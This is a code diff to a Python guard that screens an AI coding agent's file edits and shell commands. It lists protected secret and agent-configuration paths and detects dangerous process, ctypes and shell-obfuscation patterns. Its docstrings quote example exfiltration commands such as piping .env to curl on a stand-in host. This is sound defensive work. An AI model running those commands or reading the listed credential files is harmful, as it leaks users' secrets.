@@ -90,13 +90,17 @@ DEFAULT_PROTECTED_PATTERNS: Tuple[str, ...] = (
     "aboriginal",
     "sacred_site",
     "kinship",
-    "totem",
+    "totem_guidelines",
     "integrity_seal.json",
     "integrity_manifest",
     # Universal SWE security-critical asset paths & agent control plane
     ".env",
     ".git/config",
     ".git/hooks",
+    ".gitmodules",
+    ".github/workflows/",
+    ".gitlab-ci.yml",
+    ".pre-commit-config.yaml",
     ".ssh/",
     "id_rsa",
     "id_ed25519",
@@ -114,8 +118,12 @@ DEFAULT_PROTECTED_PATTERNS: Tuple[str, ...] = (
     ".claude",
     ".cursor/",
     ".cursor",
+    ".cursorrules",
+    ".windsurfrules",
     ".codex/",
     ".codex",
+    "claude.md",
+    "agents.md",
     ".claude/settings.json",
     ".claude/settings.local.json",
     ".claude/hooks",
@@ -141,6 +149,13 @@ _PROTECTED_EXACT_BASENAMES: Set[str] = {
     "credentials.json",
     "secrets.yaml",
     "secrets.json",
+    "claude.md",
+    "agents.md",
+    ".cursorrules",
+    ".windsurfrules",
+    ".gitlab-ci.yml",
+    ".pre-commit-config.yaml",
+    ".gitmodules",
 }
 
 
@@ -318,16 +333,31 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
                 if fnmatch.fnmatch(sens, seg):
                     return True
 
+    norm_segments = [seg for seg in norm_path.strip("/").split("/") if seg]
     for pat in cfg.protected_patterns:
         if pat == ".env":
             continue
         clean_pat = pat.strip("/").lower()
         if not clean_pat:
             continue
-        if pat in norm_path or pat in normalized:
-            return True
-        if clean_pat in raw_segments:
-            return True
+        if "/" in clean_pat:
+            pat_segs = [seg for seg in clean_pat.split("/") if seg]
+            plen = len(pat_segs)
+            for idx in range(max(0, len(norm_segments) - plen + 1)):
+                if norm_segments[idx : idx + plen] == pat_segs:
+                    return True
+            for idx in range(max(0, len(raw_segments) - plen + 1)):
+                if raw_segments[idx : idx + plen] == pat_segs:
+                    return True
+        elif clean_pat.startswith("."):
+            if clean_pat in norm_segments or clean_pat in raw_segments:
+                return True
+        elif "." in clean_pat:
+            if basename == clean_pat or clean_pat in norm_segments or clean_pat in raw_segments:
+                return True
+        else:
+            if clean_pat in norm_path or clean_pat in raw_segments:
+                return True
         if norm_path == clean_pat or normalized == clean_pat:
             return True
     return False
@@ -684,7 +714,7 @@ class _SecurityASTVisitor(ast.NodeVisitor):
             elif func.id == "getattr":
                 self._check_getattr(node)
             elif func.id == "open" and node.args:
-                open_path = _const_str(node.args[0])
+                open_path = self._fold_str(node.args[0]) or _const_str(node.args[0])
                 if open_path and is_protected_path(open_path):
                     self._record_finding("ast_protected_file_access", node, open_path)
 
@@ -729,7 +759,19 @@ class _SecurityASTVisitor(ast.NodeVisitor):
 
             if attr in {"read_text", "read_bytes", "open"} and isinstance(func.value, ast.Call):
                 if func.value.args:
-                    p_str = _const_str(func.value.args[0])
+                    p_str = self._fold_str(func.value.args[0]) or _const_str(func.value.args[0])
+                    if p_str and is_protected_path(p_str):
+                        self._record_finding("ast_protected_file_access", node, p_str)
+
+            if resolved_mod in {"io", "codecs", "os"} and attr == "open" and node.args:
+                p_str = self._fold_str(node.args[0]) or _const_str(node.args[0])
+                if p_str and is_protected_path(p_str):
+                    self._record_finding("ast_protected_file_access", node, p_str)
+            elif resolved_mod == "fileinput" and attr == "input" and node.args:
+                arg0 = node.args[0]
+                cand_nodes = list(arg0.elts) if isinstance(arg0, (ast.List, ast.Tuple)) else [arg0]
+                for cn in cand_nodes:
+                    p_str = self._fold_str(cn) or _const_str(cn)
                     if p_str and is_protected_path(p_str):
                         self._record_finding("ast_protected_file_access", node, p_str)
 
@@ -745,9 +787,15 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                     self._record_finding("obfuscated_encoded_payload", node, sym)
             elif resolved_mod == "importlib" and attr == "import_module":
                 self._record_finding("dynamic_import:importlib.import_module", node, "importlib.import_module")
+            elif resolved_mod == "pty" and attr in {"spawn", "fork"}:
+                self._record_finding(f"dangerous_pty_call:pty.{attr}", node, f"pty.{attr}")
+            elif resolved_mod == "ctypes" and attr in {"CDLL", "PyDLL", "OleDLL", "WinDLL", "LibraryLoader"}:
+                self._record_finding(f"dangerous_ctypes_call:ctypes.{attr}", node, f"ctypes.{attr}")
+            elif chain.startswith(("ctypes.cdll.", "ctypes.windll.", "ctypes.oledll.", "ctypes.pythonapi.")):
+                self._record_finding(f"dangerous_ctypes_call:{chain}", node, chain)
             elif resolved_mod == "subprocess" or (isinstance(func.value, ast.Name) and func.value.id == "subprocess"):
                 if attr in {"run", "Popen", "call", "check_output", "check_call", "getoutput", "getstatusoutput"}:
-                    has_shell_true = any(
+                    has_shell_true = attr in {"getoutput", "getstatusoutput"} or any(
                         kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True
                         for kw in node.keywords
                     )
@@ -759,7 +807,12 @@ class _SecurityASTVisitor(ast.NodeVisitor):
                 if attr == "rmtree":
                     self._record_finding("destructive_fs_call:shutil.rmtree", node, "shutil.rmtree")
             elif resolved_mod == "os" or (isinstance(func.value, ast.Name) and func.value.id == "os"):
-                if attr in {"system", "popen", "remove", "unlink", "rmdir", "execl", "execv", "spawnl"}:
+                if attr in {
+                    "system", "popen", "remove", "unlink", "rmdir",
+                    "execl", "execle", "execlp", "execlpe", "execv", "execve", "execvp", "execvpe",
+                    "spawnl", "spawnle", "spawnlp", "spawnlpe", "spawnv", "spawnve", "spawnvp", "spawnvpe",
+                    "posix_spawn", "posix_spawnp",
+                }:
                     self._record_finding(f"dangerous_os_call:os.{attr}", node, f"os.{attr}")
             elif resolved_mod in {"pickle", "cpickle", "marshal", "shelve"}:
                 if attr in {"loads", "load", "open"}:
@@ -1199,10 +1252,37 @@ def _parse_with_tree_sitter(ext: str, code: str) -> Tuple[bool, Optional[bool]]:
         return False, None
 
 
+def _apply_edit_ops_to_source(
+    original_source: str,
+    edit_ops: Sequence[Dict[str, Any]],
+) -> Tuple[Optional[str], Optional[str]]:
+    """Sequentially apply Edit/MultiEdit `{old_string, new_string}` operations in memory."""
+    cur = original_source
+    applied = 0
+    for op in edit_ops:
+        if not isinstance(op, dict):
+            continue
+        old_s = str(op.get("old_string") or "")
+        new_s = str(op.get("new_string") or "")
+        if not old_s:
+            continue
+        cnt = cur.count(old_s)
+        if cnt == 0:
+            return None, "edit_old_string_not_found"
+        if cnt > 1 and not bool(op.get("replace_all", False)):
+            return None, "edit_old_string_ambiguous"
+        cur = cur.replace(old_s, new_s) if bool(op.get("replace_all", False)) else cur.replace(old_s, new_s, 1)
+        applied += 1
+    if applied == 0:
+        return None, None
+    return cur, None
+
+
 def analyze_code_diff(
     file_path: Optional[str],
     diff_text: Optional[str],
     original_source: Optional[str] = None,
+    edit_ops: Optional[Sequence[Dict[str, Any]]] = None,
 ) -> Dict[str, Any]:
     """Layer 1 language-aware structural diff analysis.
 
@@ -1406,7 +1486,26 @@ def analyze_code_diff(
             seed_visitor.visit(orig_tree)
             context_ast_parsed = True
 
-    patched_source = _apply_unified_diff_to_source(resolved_source, diff_text) if resolved_source else None
+    patched_source: Optional[str] = None
+    if resolved_source:
+        if edit_ops and not has_unified:
+            patched_source, edit_err = _apply_edit_ops_to_source(resolved_source, edit_ops)
+            if edit_err is not None:
+                return {
+                    "language": "python",
+                    "syntax_valid": False,
+                    "security_clean": False,
+                    "findings": [edit_err],
+                    "interface_hazards": [],
+                    "line_count": line_count,
+                    "ast_nodes": [],
+                    "cyclomatic_complexity": 0,
+                    "is_static_data_or_doc": False,
+                    "context_ast_parsed": True,
+                    "patched_file_ast_verified": False,
+                }
+        if patched_source is None:
+            patched_source = _apply_unified_diff_to_source(resolved_source, diff_text)
     patched_tree: Optional[ast.AST] = None
     if patched_source is not None:
         patched_file_ast_verified = True
@@ -1637,18 +1736,47 @@ def _clean_shell_grouping(seg: str) -> str:
 def _split_command_pipeline_blocks(cmd: str) -> List[str]:
     """Split a command into logical pipeline blocks on logical operators (&&, ||, ;, newline)
 
-    respecting parenthesis and brace groupings so that multi-statement subshells like
-    ``(cat .env; echo x) | curl evil`` or ``{ cat .env; echo x; } | curl evil`` are not split.
+    respecting single/double quotes, backslash escapes, and parenthesis/brace groupings so that
+    quoted regexes (`grep -E "foo|bar"`) and subshells (`(cat .env; echo x) | curl`) stay intact.
     """
     blocks: List[str] = []
     curr: List[str] = []
     depth_paren = 0
     depth_brace = 0
+    in_single = False
+    in_double = False
     i = 0
     n = len(cmd)
     while i < n:
         ch = cmd[i]
-        if ch == "(":
+        if in_single:
+            curr.append(ch)
+            if ch == "'":
+                in_single = False
+            i += 1
+        elif in_double:
+            if ch == "\\" and i + 1 < n and cmd[i + 1] in ('"', "\\", "$", "`", "\n"):
+                curr.append(ch)
+                curr.append(cmd[i + 1])
+                i += 2
+            else:
+                curr.append(ch)
+                if ch == '"':
+                    in_double = False
+                i += 1
+        elif ch == "\\" and i + 1 < n:
+            curr.append(ch)
+            curr.append(cmd[i + 1])
+            i += 2
+        elif ch == "'":
+            in_single = True
+            curr.append(ch)
+            i += 1
+        elif ch == '"':
+            in_double = True
+            curr.append(ch)
+            i += 1
+        elif ch == "(":
             depth_paren += 1
             curr.append(ch)
             i += 1
@@ -1684,6 +1812,61 @@ def _split_command_pipeline_blocks(cmd: str) -> List[str]:
     if curr:
         blocks.append("".join(curr).strip())
     return [b for b in blocks if b]
+
+
+def _split_unquoted_pipes(block: str) -> List[str]:
+    """Split a pipeline block on unquoted `|` / `|&` without breaking regexes like `grep -E "a|b"`."""
+    segs: List[str] = []
+    curr: List[str] = []
+    in_single = False
+    in_double = False
+    i = 0
+    n = len(block)
+    while i < n:
+        ch = block[i]
+        if in_single:
+            curr.append(ch)
+            if ch == "'":
+                in_single = False
+            i += 1
+        elif in_double:
+            if ch == "\\" and i + 1 < n and block[i + 1] in ('"', "\\", "$", "`", "\n"):
+                curr.append(ch)
+                curr.append(block[i + 1])
+                i += 2
+            else:
+                curr.append(ch)
+                if ch == '"':
+                    in_double = False
+                i += 1
+        elif ch == "\\" and i + 1 < n:
+            curr.append(ch)
+            curr.append(block[i + 1])
+            i += 2
+        elif ch == "'":
+            in_single = True
+            curr.append(ch)
+            i += 1
+        elif ch == '"':
+            in_double = True
+            curr.append(ch)
+            i += 1
+        elif block.startswith("|&", i):
+            segs.append("".join(curr))
+            curr = []
+            i += 2
+        elif ch == "|":
+            segs.append("".join(curr))
+            curr = []
+            i += 1
+        else:
+            curr.append(ch)
+            i += 1
+    if in_single or in_double:
+        return block.replace("|&", "|").split("|")
+    if curr or segs:
+        segs.append("".join(curr))
+    return segs
 
 
 def _tokenize_shell_segment(seg: str) -> List[str]:
@@ -1744,8 +1927,9 @@ _ENV_ASSIGN_TOKEN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
 
 
 def _has_unsafe_shell_metachar(cmd: str) -> Optional[str]:
-    """Detect unquoted/expandable shell substitution (`$(...)` or backticks)."""
+    """Detect unquoted/expandable shell substitution (`$(...)`, backticks, `$'...'`, `<(...)`, complex `${...}`)."""
     in_single = False
+    in_double = False
     escaped = False
     i = 0
     n = len(cmd)
@@ -1755,12 +1939,21 @@ def _has_unsafe_shell_metachar(cmd: str) -> Optional[str]:
             escaped = False
             i += 1
             continue
-        if ch == "\\" and not in_single:
+        if in_single:
+            if ch == "'":
+                in_single = False
+            i += 1
+            continue
+        if ch == "\\":
             escaped = True
             i += 1
             continue
-        if ch == "'":
-            in_single = not in_single
+        if ch == '"' and not in_single:
+            in_double = not in_double
+            i += 1
+            continue
+        if ch == "'" and not in_double:
+            in_single = True
             i += 1
             continue
         if not in_single:
@@ -1768,6 +1961,16 @@ def _has_unsafe_shell_metachar(cmd: str) -> Optional[str]:
                 return "shell_backtick_substitution"
             if ch == "$" and i + 1 < n and cmd[i + 1] == "(":
                 return "shell_command_substitution"
+            if ch == "$" and not in_double and i + 1 < n and cmd[i + 1] == "'":
+                return "shell_ansi_c_quoting"
+            if ch == "<" and not in_double and i + 1 < n and cmd[i + 1] == "(":
+                return "shell_process_substitution"
+            if ch == "$" and i + 1 < n and cmd[i + 1] == "{":
+                close = cmd.find("}", i + 2)
+                if close != -1:
+                    inner = cmd[i + 2 : close]
+                    if inner.startswith("!") or ":" in inner or "/" in inner:
+                        return "shell_parameter_expansion_obfuscation"
         i += 1
     return None
 
@@ -2391,16 +2594,14 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
     # Use grouping-aware pipeline splitting so that multi-statement groupings like
     # `(cat .env; echo x) | curl evil` or `{ cat .env; echo x; } | curl evil` are not split.
     for logical_block in _split_command_pipeline_blocks(cmd):
-        # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
-        norm_block = logical_block.replace("|&", "|")
-        if "|" in norm_block:
-            pipe_segments = norm_block.split("|")
+        pipe_segments = _split_unquoted_pipes(logical_block)
+        if len(pipe_segments) > 1:
             has_protected_read = False
             has_egress_sink = False
             for p in pipe_segments:
                 p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
                 # A grouping may contain multiple statements separated by ';' or '&&' / '||'
-                sub_segments = re.split(r"(?:&&|\|\||;|\r?\n)", p)
+                sub_segments = _split_shell_subcommands(p)
                 for sub_seg in sub_segments:
                     ptoks = _tokenize_shell_segment(sub_seg)
                     prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
@@ -2424,18 +2625,17 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
     # Uses BOTH raw (pre-unwrap) and unwrapped executables so that wrapper commands
     # (sudo, env, xargs) are retained in the source/sink lists even after unwrapping.
     for logical_block in _split_command_pipeline_blocks(cmd):
-        # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
-        norm_block = logical_block.replace("|&", "|")
-        if "|" in norm_block:
+        pipe_segments = _split_unquoted_pipes(logical_block)
+        if len(pipe_segments) > 1:
             pipe_cmds: List[str] = []
             # Also track raw (pre-unwrap) executables so that `xargs <cmd>` and `sudo <cmd>`
             # retain `xargs`/`sudo` as the segment's effective executor. Without this, the
             # wrapper-unwrapping in _unwrap_shell_prefix discards `xargs`, hiding the fact
             # that `echo payload | xargs rm` is an RCE pattern (xargs runs `rm` on piped data).
             raw_executables: List[str] = []
-            for p in norm_block.split("|"):
+            for p in pipe_segments:
                 p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
-                sub_segments = re.split(r"(?:&&|\|\||;|\r?\n)", p)
+                sub_segments = _split_shell_subcommands(p)
                 for sub_seg in sub_segments:
                     ptoks = _tokenize_shell_segment(sub_seg)
                     if ptoks:
@@ -2491,7 +2691,7 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
     # so it also fires for standalone `eval "..."`, `source script`, `. ./init.sh`.
     _DIRECT_RCE_BUILTINS = {"eval", "exec", "source"}
     for logical_block in _split_command_pipeline_blocks(cmd):
-        for sub_seg in re.split(r"(?:&&|\|\||;|\r?\n)", logical_block):
+        for sub_seg in _split_shell_subcommands(logical_block):
             toks = _tokenize_shell_segment(sub_seg)
             prem, _, _, _, _ = _unwrap_shell_prefix(toks)
             eff = prem or toks
@@ -2653,6 +2853,24 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             if has_777 and has_root_or_rec:
                 findings.append("dangerous_chmod_777")
 
+        elif exe in {"rg", "ag"}:
+            if any(
+                a in {"--unrestricted", "--hidden", "--no-ignore", "--no-ignore-dot", "-."}
+                or (a.startswith("-") and not a.startswith("--") and "u" in a[1:])
+                for a in args_lower
+            ):
+                protected_path_reads.append("hidden_file_search")
+
+        elif exe in {"grep", "egrep", "fgrep"}:
+            has_rec = any(
+                a == "--recursive" or (a.startswith("-") and not a.startswith("--") and ("r" in a[1:] or "R" in a[1:]))
+                for a in args
+            )
+            non_flag = [a for a in args if not a.startswith("-")]
+            targets_root_or_dot = any(t in {".", "./", "~", "~/"} or t.startswith("/") for t in non_flag[1:])
+            if (has_rec and targets_root_or_dot) or any(a.startswith("--include=.") for a in args_lower):
+                protected_path_reads.append("hidden_file_search")
+
         elif exe == "find":
             # Starting points precede the first expression token; `{}` expands to paths under them.
             start_paths: List[str] = []
@@ -2660,6 +2878,10 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
                 if tok.startswith(("-", "(", "!", ")")):
                     break
                 start_paths.append(tok)
+            for idx_arg, a_low in enumerate(args_lower):
+                if a_low in {"-name", "-iname", "-path", "-ipath"} and idx_arg + 1 < len(args):
+                    if args[idx_arg + 1].lstrip("\"'").startswith("."):
+                        protected_path_reads.append("hidden_file_search")
             if "-delete" in args_lower:
                 for sp in start_paths:
                     del_res = analyze_shell_command(f"rm -rf {shlex.quote(sp)}", policy=policy)
@@ -2830,6 +3052,17 @@ def _is_agent_control_plane_path(path_str: str) -> bool:
     return any(seg in _AGENT_CONTROL_PLANE_SEGMENTS for seg in norm_segments)
 
 
+_DEV_ESCALATE_ONLY_AST_FINDINGS: Set[str] = {
+    "subprocess_call:run",
+    "subprocess_call:Popen",
+    "subprocess_call:call",
+    "subprocess_call:check_output",
+    "subprocess_call:check_call",
+    "dangerous_os_call:os.remove",
+    "dangerous_os_call:os.unlink",
+}
+
+
 def decide(
     input_data: Any,
     context: Optional[Dict[str, Any]] = None,
@@ -2862,6 +3095,7 @@ def decide(
         cmd_str = input_data.get("cmd") or input_data.get("command") or (target_path if tool_name in ("run_command", "execute_shell") else None)
         query_text = str(input_data.get("query") or input_data.get("task_prompt") or "")
         original_source = input_data.get("file_content") or ctx.get("file_content")
+        edit_ops = input_data.get("edit_ops")
     else:
         tool_name = str(ctx.get("tool") or "")
         target_path = ctx.get("path")
@@ -2873,6 +3107,7 @@ def decide(
         cmd_str = ctx.get("cmd")
         query_text = str(input_data or "")
         original_source = ctx.get("file_content")
+        edit_ops = None
 
     shadow_mode = bool(ctx.get("shadow_mode", False))
     available_tools = ctx.get("available_tools")
@@ -2894,6 +3129,7 @@ def decide(
     )
 
     diff_structural_context: List[Dict[str, Any]] = []
+    pending_taint_record: Optional[Tuple[Any, str, str, bool]] = None
 
     def _tail_journal_recent(path: Path, limit: int = 12) -> List[Dict[str, Any]]:
         if not path.exists():
@@ -3012,6 +3248,9 @@ def decide(
             elif reason_code in ("layer1_ast_syntax_error", "layer1_partial_hunk_without_source"):
                 risk_lvl = "MEDIUM"
                 risk_assess = f"Syntactic or structural ambiguity: {label}"
+            elif reason_code == "layer1_ast_dev_escalate":
+                risk_lvl = "MEDIUM"
+                risk_assess = f"Process or filesystem call ({label}) in dev profile requires confirmation."
             elif reason_code.startswith("strict_ast_"):
                 risk_lvl = "MEDIUM"
                 risk_assess = f"Strict AST policy unapproved element: {label}"
@@ -3028,6 +3267,9 @@ def decide(
                 "risk_level": risk_lvl,
                 "risk_assessment": risk_assess,
             }
+        if pending_taint_record is not None and decision != "deny" and not shadow_mode:
+            t_sess, t_tool, t_path, t_prot = pending_taint_record
+            t_sess.record_pre_tool(t_tool, t_path, t_prot)
         if diff_structural_context:
             out["structural_context"] = diff_structural_context
         if shadow_mode:
@@ -3100,7 +3342,7 @@ def decide(
                 return _finish("deny", taint_res["label"], ["deny"], taint_res["reason_code"], 0)
             if taint_res["decision"] == "escalate":
                 return _finish("escalate", taint_res["label"], ["escalate", "deny"], taint_res["reason_code"], 0)
-            sess.record_pre_tool(clean_tool, str(target_path or ""), is_protected_path(target_path, cfg))
+            pending_taint_record = (sess, clean_tool, str(target_path or ""), is_protected_path(target_path, cfg))
 
         # --- Layer 1: Structural AST, Secret Egress & Allowlist-First Shell Parsers ---
         if any(isinstance(val, str) and "\x00" in val for val in (target_path, cmd_str, diff_text, query_text)):
@@ -3166,9 +3408,15 @@ def decide(
                 original_source is None
                 and ("@@" in diff_text or diff_text.lstrip().startswith(("diff --git", "--- ", "+++ ")))
             )
-            diff_res = analyze_code_diff(target_path, diff_text, original_source=original_source)
+            diff_res = analyze_code_diff(target_path, diff_text, original_source=original_source, edit_ops=edit_ops)
             diff_structural_context.extend(diff_res.get("structural_context", []))
             if not diff_res["security_clean"]:
+                if (
+                    str(cfg.profile or "strict").strip().lower() == "dev"
+                    and diff_res["findings"]
+                    and all(f in _DEV_ESCALATE_ONLY_AST_FINDINGS for f in diff_res["findings"])
+                ):
+                    return _finish("escalate", diff_res["findings"][0], ["allow", "deny"], "layer1_ast_dev_escalate", 1)
                 return _finish("deny", diff_res["findings"][0], ["deny"], "layer1_ast_security_veto", 1)
             if not diff_res["syntax_valid"]:
                 if diff_res.get("partial_hunk_needs_source"):
